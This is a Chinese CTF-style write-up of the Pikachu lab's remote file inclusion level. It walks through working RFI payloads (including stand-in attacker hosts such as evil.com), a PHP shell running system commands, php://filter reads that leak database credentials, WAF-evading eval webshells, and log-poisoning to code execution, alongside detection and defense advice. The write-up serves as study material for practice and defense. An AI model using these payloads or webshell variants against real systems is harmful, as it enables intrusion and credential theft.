---
layout: post
title: Pikachu - File Inclusion 远程文件包含 Writeup（allow_url_include 与 wrapper）
platform: pikachu
date: 2026-10-29 20:13:00 +0800
categories: CTF
---

Pikachu - File Inclusion 远程文件包含 Writeup（allow_url_include 与 wrapper）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：File Inclusion → File Inclusion(remote)
- 地址：`http://localhost/pikachu/vul/fileinclude/fi_remote.php`
- 题型：Web
- 考点：**远程文件包含（RFI）**、`allow_url_include`、PHP wrapper（协议封装）

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
操作系统：Windows NT

php.ini 第 849 行：allow_url_fopen   = On
php.ini 第 853 行：allow_url_include = Off     ← ★ 本题的关键
php.ini 路径：D:\phpstudy_pro\Extensions\php\php7.3.4nts\php.ini
```

**★ 打开页面就有一条红色警告**：

```
warning:你的allow_url_include没有打开,请在php.ini中打开了再测试该漏洞,记得修改后,重启中间件服务!
```

**★ 这是本模块唯一"需要改配置"的关卡。**

**✅ 实测结果（默认配置 allow_url_include=Off）**

| # | `filename` 参数 | 结果 |
|---|---|---|
| 1 | `http://127.0.0.1:8000/shell.txt` | **Warning: http:// wrapper is disabled ... by allow_url_include=0** ❌ |
| 2 | `data://text/plain,<?php phpinfo();?>` | **Warning: data:// wrapper is disabled ... by allow_url_include=0** ❌ |
| 3 | `php://input`（POST body 塞代码）| **Warning: include(php://input): failed to open stream: operation failed** ❌ |
| 4 | **`php://filter/convert.base64-encode/resource=../../inc/config.inc.php`** | **✅ 成功返回 base64，解码后是 config.inc.php 源码** |

**★ 第 4 条是最有价值的发现**：

```
即使 allow_url_include = Off（RFI 打不了）
php://filter 依然能用 → 依然能读源码
★ allow_url_include 只限制 http:// data:// php://input 这类"输入流"
★ php://filter 是"过滤器"，不受这个开关影响
```

**★ 第 4 条解码后的内容（前几行）**：

```php
<?php
//全局session_start
session_start();
//全局居设置时区
date_default_timezone_set('Asia/Shanghai');
//全局设置默认字符
header('Content-type:text/html;charset=utf-8');
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPW', 'root');          ← ★ 数据库密码
```

二、题目分析

**① 漏洞代码：这次连前缀都没有**

```php
<?php
// fi_remote.php 第 19-40 行

$html1 = '';
if(!ini_get('allow_url_include')){
    $html1 .= "<p style='color: red'>warning:你的allow_url_include没有打开,
               请在php.ini中打开了再测试该漏洞,记得修改后,重启中间件服务!</p>";
}

$html2 = '';
if(!ini_get('allow_url_fopen')){
    $html2 .= "<p style='color: red;'>warning:你的allow_url_fopen没有打开...</p>";
}

//远程文件包含漏洞,需要php.ini的配置文件符合相关的配置
$html = '';
if(isset($_GET['submit']) && $_GET['filename'] != null){
    $filename = $_GET['filename'];
    include "$filename";        // ★ 完整路径由用户控制，没有前缀
}
?>
```

**★ 和上一关（本地包含）的对比**：

```php
// 本地包含（fi_local.php）
include "include/$filename";    ← 有前缀，wrapper 会被破坏

// 远程包含（fi_remote.php）
include "$filename";            ← ★ 没有前缀，任意协议都能用
```

**★ 这个差别决定了**：

```
本地那关：php://filter 用不了（前缀破坏协议头）
这一关：  php://filter 能用（实测成功了）
```

**② `allow_url_include` 是什么**

**★ PHP 的一个安全开关，控制 `include` 能不能加载"远程/特殊协议"的文件。**

```ini
; php.ini
allow_url_include = Off      ; 默认值（PHP 5.2+）
allow_url_include = On       ; 打开后 RFI 才可行
```

**★ 它和 `allow_url_fopen` 的区别**：

| 开关 | 控制什么 | 默认 |
|---|---|---|
| `allow_url_fopen` | `fopen()` / `file_get_contents()` 能否读远程 URL | **On** |
| `allow_url_include` | `include` / `require` 能否包含远程 URL | **Off** |

**★ 为什么不默认开？**

```
PHP 5.2（2006 年）之前 allow_url_include 默认是 On
→ RFI 漏洞泛滥
→ 大量网站被"一行代码"getshell

PHP 5.2 起改成默认 Off
→ 这是 PHP 历史上最重要的一次"安全默认值"调整
```

**③ 实测三种 wrapper 的失败原因**

**★ `http://`**：

```
Warning: include(): http:// wrapper is disabled in the server configuration
         by allow_url_include=0
         in D:\phpstudy_pro\WWW\pikachu\vul\fileinclude\fi_remote.php on line 37
         └──────────────────────┬──────────────────────┘
                      ★ 直接告诉你"被 allow_url_include=0 禁用了"
```

**★ `data://`**：

```
Warning: include(): data:// wrapper is disabled in the server configuration
         by allow_url_include=0
```

**★ `php://input`**：

```
Warning: include(php://input): failed to open stream: operation failed
```

**★ 注意 `php://input` 的报错不一样**：

```
它不是"wrapper is disabled"，而是"failed to open stream"
→ 因为 php://input 在 include 场景下需要 allow_url_include
→ 但报错方式不同（PHP 的实现细节）
```

**④ ⭐ 重要发现：`php://filter` 不受 `allow_url_include` 限制**

**★ 实测**：

```
filename=php://filter/convert.base64-encode/resource=../../inc/config.inc.php
→ ✅ 成功，页面出现一长串 base64
→ 解码后就是 config.inc.php 的源码
```

**★ 为什么？**

```
php://filter 不是"输入流"，是"过滤器"
它的作用是"对本地文件做编码/转换"
★ 它操作的还是【本地文件】（resource= 后面是本地路径）
★ 所以不需要 allow_url_include
```

**★ 这一点非常重要（实战价值高）**：

```
很多环境 allow_url_include 是 Off
→ RFI（http:// / data://）打不了
→ 但 php://filter 往往还能用
→ 依然能读源码、读配置、读密码
★ 别因为"RFI 不行"就放弃 —— 试试 php://filter
```

**★ 本关的路径计算（从 `vul\fileinclude\` 出发）**：

```
fileinclude\   →  ..\  →  vul\  →  ..\  →  pikachu\  →  inc\config.inc.php
★ 所以是 ../../inc/config.inc.php（2 个 ..）
```

**⑤ RFI 的本质：把"远程代码"当"本地代码"执行**

**★ 正常场景**：

```php
include "header.php";                  // 加载本地模板
include "include/file1.php";           // 加载本地数据
```

**★ RFI 场景**：

```php
include "http://attacker.com/shell.txt";   // ★ 加载远程代码
```

**★ 为什么危险**：

```
include 不关心"文件来自哪里"
只要内容是 <?php ... ?>，就会被执行

★ 攻击者完全控制那个文件的内容
→ 等于"任意代码执行"
→ 不需要上传、不需要日志污染、不需要任何配合
```

**★ 所以 RFI 是"一步到位"的 getshell**：

```
LFI：读文件 → 需要配合（上传/日志/session）才能执行代码
RFI：直接执行远程代码 → 本身就是 RCE
```

三、解题步骤

**★ 本关需要两步：改配置（让 RFI 可行）+ 起一个攻击服务器（放恶意文件）。**

**第 1 步：改 `php.ini`**

```text
① 打开 D:\phpstudy_pro\Extensions\php\php7.3.4nts\php.ini
② 跳到第 853 行
③ 把 allow_url_include=Off 改成 allow_url_include=On
④ 保存
```

**★ 三种改法**：

```
方式 1：记事本
   右键 php.ini → 打开方式 → 记事本
   Ctrl+G → 输入 853 → 回车
   把 Off 改成 On → Ctrl+S

方式 2：phpstudy 面板
   软件管理 → PHP → php7.3.4nts → 配置 → 打开 php.ini

方式 3：VS Code / Notepad++
```

**第 2 步：重启 Apache**

```text
phpstudy 面板 → 首页 → Apache 2.4.39 → 【停止】 → 【启动】
或者：右上角 → 一键重启
```

**★ 必须重启**：

```
php.ini 是"启动时读取"的
不重启 → 修改不生效
★ 这是最常见的"改了没用"的原因
```

**第 3 步：确认修改生效**

```text
① 刷新 File Inclusion(remote) 页面
② 那条红色 warning 应该消失了
```

**★ 如果还在**：

```
· 确认改的是 D:\phpstudy_pro\Extensions\php\php7.3.4nts\php.ini
  （用 php -r "echo php_ini_loaded_file();" 确认加载路径）
· 确认 Apache 真的重启了
· 确认没有多份 php.ini
```

**第 4 步：准备"攻击服务器"**

**★ RFI 需要一台能放文件的服务器。本机测试可以用 Python 起一个。**

**★ 建一个目录，放 `shell.txt`**：

```php
<?php
echo "<h3>RFI_OK</h3>";
echo "PHP version: " . phpversion() . "<br />";
echo "当前被包含的文件: " . __FILE__ . "<br />";
echo "执行命令 whoami: ";
system("whoami");
echo "<hr />";
phpinfo();
?>
```

**★ 起 HTTP 服务**：

```powershell
cd C:\你放shell.txt的目录
python -m http.server 8000 --bind 127.0.0.1
```

**★ 验证**：

```
浏览器访问 http://127.0.0.1:8000/shell.txt
→ 应该看到文件的原始内容（PHP 源码，没被执行）
★ 因为 Python 的 http.server 只是"发文件"，不解析 PHP
→ 这正是 RFI 需要的
```

**第 5 步：⭐ 发起远程包含**

**★ 浏览器地址栏粘**：

```
http://localhost/pikachu/vul/fileinclude/fi_remote.php?filename=http://127.0.0.1:8000/shell.txt&submit=提交
```

**★ 预期结果**：

```text
RFI_OK
PHP version: 7.3.4
当前被包含的文件: http://127.0.0.1:8000/shell.txt
执行命令 whoami: laptop-tevghr57\cecilia
（然后是一大段 phpinfo）
```

**★ 这就是"远程代码执行"**：

```
服务器去请求 http://127.0.0.1:8000/shell.txt
→ 拿到 <?php ... ?> 的内容
→ 当 PHP 代码执行
→ 输出结果

★ 攻击者只需要"一个能放文件的 HTTP 服务"
★ 不需要上传点、不需要写日志、不需要任何配合
```

**第 6 步（备选）：不用改配置也能读源码**

**★ 如果不想改 php.ini，用 `php://filter`**：

```
http://localhost/pikachu/vul/fileinclude/fi_remote.php?filename=php://filter/convert.base64-encode/resource=../../inc/config.inc.php&submit=提交
```

**★ 结果**：页面出现一长串 base64。

**★ 解码方法（PowerShell）**：

```powershell
$b64 = "把页面上的那串粘进来"
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
```

**★ 或者用 Python**：

```python
import base64
print(base64.b64decode("那串").decode())
```

**★ 会看到**：

```php
define('DBUSER', 'root');
define('DBPW', 'root');
```

**★ 这一步不需要改 php.ini —— 因为 `php://filter` 不受 `allow_url_include` 限制（实测确认）。**

**第 7 步：完整 payload 汇总**

```
// ========== 需要 allow_url_include=On ==========

// 远程 HTTP 包含（最经典）
http://攻击者服务器/shell.txt

// data:// 内联（不用起服务器，但 payload 长度受限）
data://text/plain,<?php phpinfo();?>
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+

// php://input（POST body 当代码，需要 POST 方法）
php://input
    POST body: <?php phpinfo();?>

// ========== 不需要 allow_url_include ==========

// php://filter 读源码
php://filter/convert.base64-encode/resource=../../inc/config.inc.php

// php://filter + 多次编码（绕过 WAF）
php://filter/convert.base64-encode|convert.base64-encode/resource=../../inc/config.inc.php
```

四、延伸知识

**① PHP wrapper（协议封装）全家桶**

**★ `include` 能加载的"协议"**：

| wrapper | 用途 | 需要 allow_url_include？ |
|---|---|---|
| `file://` | 本地文件 | ❌ 不需要 |
| `http://` / `https://` | 远程文件 | ✅ **需要** |
| `ftp://` | FTP | ✅ 需要 |
| `php://filter` | 过滤/编码 | ❌ **不需要** |
| `php://input` | POST body | ✅ **需要** |
| `data://` | 内联数据 | ✅ **需要** |
| `zip://` | 压缩包内文件 | ❌ 不需要 |
| `phar://` | phar 包内文件 | ❌ 不需要 |
| `expect://` | 执行命令（需装扩展）| ✅ 需要 |

**★ 几个高级 wrapper**：

**`zip://`（配合上传压缩包）**：

```
① 上传一个 zip（里面是 shell.php）
② include "zip://上传的zip路径#shell.php"
★ 不需要 allow_url_include
★ 常用于"只允许上传图片/压缩包"的场景
```

**`phar://`（配合反序列化）**：

```
① 上传一个 phar 文件（伪装成图片）
② include "phar://上传的文件/test.txt"
★ phar 的元数据会自动反序列化 → 触发魔术方法
★ 这是"文件上传 + 反序列化"的经典组合
```

**`data://`（不用起服务器）**：

```
data://text/plain,<?php phpinfo();?>
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
★ 但要 URL 编码（空格 %20、引号 %22 等）
★ 长度受限（URL 长度限制）
```

**② `allow_url_fopen` vs `allow_url_include`**

**★ 两个开关容易混**：

| | `allow_url_fopen` | `allow_url_include` |
|---|---|---|
| 控制 | `fopen` / `file_get_contents` | `include` / `require` |
| 默认 | **On** | **Off** |
| 打开后能做什么 | 读远程 URL 的内容 | **把远程 URL 当 PHP 代码执行** |
| 危险程度 | 中（能 SSRF / 读数据）| **高（直接 RCE）** |

**★ 一个实际场景**：

```php
// include 一个远程文件 → 需要 allow_url_include=On
include "http://evil.com/shell.txt";        // ❌ 默认失败

// 但 file_get_contents 读远程文件 → 只需要 allow_url_fopen=On
echo file_get_contents("http://evil.com/data.txt");   // ✅ 默认可行
```

**★ 所以**：

```
即使 allow_url_include 是 Off
只要 allow_url_fopen 是 On
→ 依然能做 SSRF、读远程数据
★ 这也是"SSRF 比 RFI 更常见"的原因
```

**③ RFI 的实战利用技巧**

**技巧 1：用 `data://` 不起服务器（快速验证）**

```
?filename=data://text/plain,<?php phpinfo();?>
★ 适合"只想确认漏洞存在"
★ 不适合"传大马"（URL 长度限制）
```

**技巧 2：payload 免杀（绕过 WAF/杀软）**

```php
// 直接写 eval 容易被拦
<?php @eval($_POST[1]);?>

// 拆开写
<?php
$a = 'ev'; $b = 'al';
$c = $a . $b;
$c($_POST[1]);
?>

// 或者 base64 编码后再 eval
<?php eval(base64_decode($_POST[1]));?>
```

**技巧 3：远程文件放"正常内容 + PHP 尾巴"**

```php
// 先输出正常图片，再执行代码
（PNG 二进制内容）
<?php system($_GET['cmd']); ?>
★ 访问时既能看到图片（伪装），又能执行命令
```

**技巧 4：用"日志包含"代替 RFI（当 allow_url_include=Off 时）**

```
① 让服务器把 PHP 代码写进日志
   GET /<?php system($_GET['c']);?> HTTP/1.1
   
② include 日志文件
   ?filename=../../../../Apache/logs/access.log

★ 不需要 allow_url_include
★ 这是"LFI 升级成 RCE"的经典方法
```

**④ 如何检测有没有 RFI**

**防御方视角**：

```bash
# ① 查 allow_url_include 是否被打开
php -i | grep allow_url_include

# ② 全局搜索 include/require 里是否用了"用户输入"
grep -rn "include.*\$_" /var/www/

# ③ 日志里找"包含 URL 的请求"
grep "filename=http" /var/log/apache2/access.log
```

**★ 一个特征**：

```
RFI 的请求里，参数值是"外部 URL"
    ?page=http://...
    ?file=https://...
    ?lang=ftp://...

★ 看到这种 → 高度可疑
```

**⑤ 防御**

**❌ 本关的反面教材**：

```php
include "$filename";        // 完整路径由用户控制
```

**✅ 正确做法 1：白名单（同上一关）**

```php
$allowed = ['home' => 'home.php', 'about' => 'about.php', 'contact' => 'contact.php'];
$page = $_GET['page'] ?? 'home';
if (!isset($allowed[$page])) {
    die('页面不存在');
}
include $allowed[$page];
```

**✅ 正确做法 2：关掉 `allow_url_include`（默认就是这样）**

```ini
; php.ini
allow_url_include = Off
```

**★ 这是"最重要的防护"**：

```
只要它关着，http:// data:// php://input 全都用不了
RFI 直接被掐死
★ 而且这是"默认值"—— 只要不改就不会有 RFI
```

**★ 但要注意**：

```
php://filter 仍然可用（读源码）
→ 所以"关掉 allow_url_include"不等于"防住文件包含漏洞"
→ 还是必须用白名单
```

**✅ 正确做法 3：`open_basedir` 限制目录**

```ini
open_basedir = D:/phpstudy_pro/WWW/pikachu/
```

**★ 能防住"读系统文件"，但防不住"包含网站内文件"。**

**✅ 正确做法 4：禁用危险 wrapper**

```ini
; PHP 没有"直接禁用某个 wrapper"的配置
; 但可以用 suhosin 扩展，或者用 open_basedir 限制

; 比较实用的做法：把 allow_url_include 保持 Off
```

**⑥ 为什么现代环境很少见 RFI**

**★ 三个原因**：

```
① PHP 5.2+ 默认 allow_url_include=Off
   → 绝大多数环境天然没有 RFI

② 现代框架不用"动态 include 用户输入"
   → 路由是"映射表"，不是"直接拼路径"

③ WAF 会拦"参数里出现 http://"
   → 一眼就能识别
```

**★ 但 RFI 依然出现在**：

```
· 老的 CMS / 自研系统（2010 年前后）
· CTF 题目（会明确要求你改配置）
· 配置疏忽的机器（管理员为了"某个功能"打开了它）
· 内网 / 测试环境（图省事全开）
```

**⑦ 本模块两关的对比**

| | 本地包含（LFI）| **远程包含（RFI）** |
|---|---|---|
| 代码 | `include "include/$filename"` | **`include "$filename"`** |
| 前缀 | 有（限制在 include/）| **无（完全自由）** |
| 需要改配置 | ❌ 不需要 | ✅ **需要 allow_url_include=On** |
| 能读本地文件 | ✅ | ✅ |
| 能执行代码 | ⚠️ 需要配合 | ✅ **直接可以** |
| 攻击者需要 | 一个能穿越的路径 | **一台能放文件的服务器** |
| 现实中常见度 | 常见 | 少见（默认关闭）|

**★ 一句话**：

```
LFI 是"读"，要配合才能执行
RFI 是"直接执行"，一步到位
```

五、总结

- **本题核心：`include "$filename"` 没有前缀 → 配合 `allow_url_include=On` 就能加载远程 PHP 文件并执行 → 直接 getshell。**

- **一行漏洞代码**：

```php
include "$filename";        // 完整路径由用户控制，没有任何过滤
```

- **⭐ 八个必记要点**：

```text
① RFI 需要 allow_url_include=On
   默认是 Off（PHP 5.2+）→ 本环境也是 Off
   ★ 这是本模块唯一需要改配置的关卡

② 改 php.ini 后必须重启 Apache
   本环境：第 853 行 allow_url_include=Off → On
   路径：D:\phpstudy_pro\Extensions\php\php7.3.4nts\php.ini
   ★ "改了没生效"最常见的原因就是没重启

③ 实测三种 wrapper 的报错
   http://   → http:// wrapper is disabled ... by allow_url_include=0
   data://   → data:// wrapper is disabled ... by allow_url_include=0
   php://input → include(php://input): failed to open stream: operation failed

④ ⭐ php://filter 不受 allow_url_include 限制
   实测：allow_url_include=Off 时依然能读源码
   php://filter/convert.base64-encode/resource=../../inc/config.inc.php
   ★ 这是"RFI 打不了时"的重要替代方案

⑤ 本关没有前缀（和上一关不同）
   include "$filename"  → 任意 wrapper 都能用
   ★ 上一关 include "include/$filename" → php://filter 失效

⑥ RFI 是"一步到位的 RCE"
   不需要上传点、不需要日志污染
   只要攻击者有一台能放文件的 HTTP 服务器

⑦ wrapper 全家桶
   http:// data:// php://input ftp://  → 需要 allow_url_include
   php://filter zip:// phar:// file:// → 不需要
   ★ zip:// 和 phar:// 是"配合上传"的进阶用法

⑧ 防御
   allow_url_include=Off（默认，最重要）
   + 白名单（根本）
   + open_basedir（限制目录）
   ★ 关掉 allow_url_include 不等于安全（php://filter 还能用）
```

- **实测数据**：

```text
allow_url_include=Off 时：
    http://127.0.0.1:8000/shell.txt   → Warning: http:// wrapper is disabled ... allow_url_include=0
    data://text/plain,<?php phpinfo();?> → Warning: data:// wrapper is disabled ... allow_url_include=0
    php://input                       → Warning: failed to open stream
    php://filter/.../resource=../../inc/config.inc.php → ✅ 成功读出源码（base64）

php.ini：
    849 行  allow_url_fopen=On
    853 行  allow_url_include=Off     ← 要改成 On
```

- **进度：File Inclusion 2/2 完成**

```text
platform: pikachu   30 篇

├── 暴力破解       4/4    ✅
├── CSRF           3/3    ✅
├── XSS           10/10   ✅
├── SQL 注入      10/10   ✅
├── RCE            2/2    ✅
└── File Inclusion 2/2    ✅  ← 刚收官（本地 + 远程）
```

**手工复现要点**：

```text
【方案 A：开启 RFI 完整复现】
· 改 php.ini 第 853 行 → allow_url_include=On
· 重启 Apache
· 刷新页面 → warning 消失
· 起 HTTP 服务：python -m http.server 8000（目录里放 shell.txt）
· 访问 ?filename=http://127.0.0.1:8000/shell.txt
· 看到 RFI_OK + phpinfo + whoami

【方案 B：不改配置，用 php://filter】
· 访问 ?filename=php://filter/convert.base64-encode/resource=../../inc/config.inc.php
· 页面出现 base64 → 解码 → 看到 DBPW: root
· ★ 证明"php://filter 不受 allow_url_include 限制"
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  远程包含（RFI）= "让 PHP 去加载攻击者服务器上的代码"            │
│                                                            │
│  include "$filename"                                       │
│      → filename=http://evil.com/shell.txt                  │
│      → 远程 PHP 代码被本地执行 → 直接 getshell               │
│                                                            │
│  ★ 前提：allow_url_include = On（默认 Off）                   │
│  ★ 改完 php.ini 必须重启 Apache                               │
│                                                            │
│  ★ 但注意：allow_url_include=Off 时                           │
│      php://filter 依然能读源码                                │
│      ★ 别因为"RFI 打不了"就放弃 —— 试试 php://filter           │
│                                                            │
│  ★ 防御：allow_url_include=Off（默认） + 白名单                │
└────────────────────────────────────────────────────────────┘
```
